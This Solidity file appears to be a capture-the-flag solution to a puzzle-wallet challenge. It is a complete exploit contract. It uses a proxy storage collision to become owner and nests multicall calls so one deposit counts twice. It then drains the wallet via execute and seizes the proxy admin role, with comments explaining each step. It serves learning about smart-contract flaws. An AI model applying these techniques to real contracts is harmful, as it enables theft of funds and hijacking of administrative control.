// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface PuzzleProxy {
    function proposeNewAdmin(address _newAdmin) external;
}

interface PuzzleWallet {
    function addToWhitelist(address addr) external;

    function multicall(bytes[] memory data) external payable;

    function execute(
        address to,
        uint256 value,
        bytes calldata data
    ) external payable;

    function deposit() external payable;

    function setMaxBalance(uint256 _maxBalance) external;
}

contract Solve {
    // NOTE: This address is the proxy contract. It delegates function calls to the real
    // contract when the function doesn't exist on the proxy.
    // This is why both addresses below are the same.
    PuzzleProxy proxyContract =
        PuzzleProxy(0x390df5c5680248ED533aa598C9d66E6C874fe3Ea);
    PuzzleWallet puzzleContract =
        PuzzleWallet(0x390df5c5680248ED533aa598C9d66E6C874fe3Ea);

    function solve() public payable {
        // First, become an admin. Any time a call is proxied through to the PuzzleWallet, it's owner
        // variable will clash with the pendingAdmin variable in the proxy, so setting the pendingAdmin
        // will actually set the owner too.
        proxyContract.proposeNewAdmin(address(this));

        // Now, we're able to whitelist ourselves
        puzzleContract.addToWhitelist(address(this));

        // Now, the contract has a `balances[]` mapping to store balances for each address.
        // The trick here is if we can call `deposit()` multiple times in the same transaction,
        // we can send, for example, 1 ether in the transaction (so msg.value would be 1), but `deposit()`
        // would increase our balance however many times we call it. Since it's the same transaction, we've
        // only ever sent 1 ether, so the contract overall will have a balance of `currentBalance + 1`, but
        // our balance in the `balances[]` mapping would go up multiple times.
        // This would then allow us to drain the wallet through execute.
        //
        // We can call deposit() multiple times in the same transaction using the `multicall` function,
        // because calling functions in the same contract through delegatecall() does not count as
        // separate transactions. However, the problem is that multicall will check if we try to call
        // deposit() multiple times. However, the boolean it uses to check whether deposit() has been
        // called multiple times is local, so we can use multicall to call multicall, which will
        // subsequently call deposit().
        //
        // First, set up the calldata for the initial multicall correctly. We'll want to call
        // multicall twice through the initial multicall, where each inner multicall's calldata
        // will call deposit()
        bytes[] memory depositCallData = new bytes[](1);
        depositCallData[0] = abi.encodeWithSelector(
            puzzleContract.deposit.selector
        );

        bytes[] memory initialMulticallData = new bytes[](2);

        initialMulticallData[0] = abi.encodeWithSelector(
            puzzleContract.multicall.selector,
            depositCallData
        );
        initialMulticallData[1] = abi.encodeWithSelector(
            puzzleContract.multicall.selector,
            depositCallData
        );

        // Now, make the call to multicall. We need to use the `call()` function to do this for two reasons:
        // 1. We need to be able to pass a specific msg.value to this function call
        // 2. Solidity does not like the `bytes[2] memory` type from above to be passed to a function that
        //    takes a `bytes[] calldata` type.
        //
        // Make sure to send 0.001 ether with this transaction!
        require(
            msg.value == 0.001 ether,
            "Need to send 0.001 ether when making this transaction"
        );
        puzzleContract.multicall{value: 0.001 ether}(initialMulticallData);

        // Now, `balances[this_contracts_address] should be 0.002, while we've only sent 0.001 ether.
        // The challenge contract starts off with 0.001 ether initially, so it will now have 0.002 ether.
        // Since our balance equals the contract's balance, we can call `execute()` now and drain the contract.
        // We send ourselves the fund by setting our player address
        puzzleContract.execute(msg.sender, 0.002 ether, "");

        // Now, we can set the max balance. This variable is stored in the same storage slot as the admin
        // in the proxy contract, so we become admin
        puzzleContract.setMaxBalance(uint256(uint160(msg.sender)));
    }
}
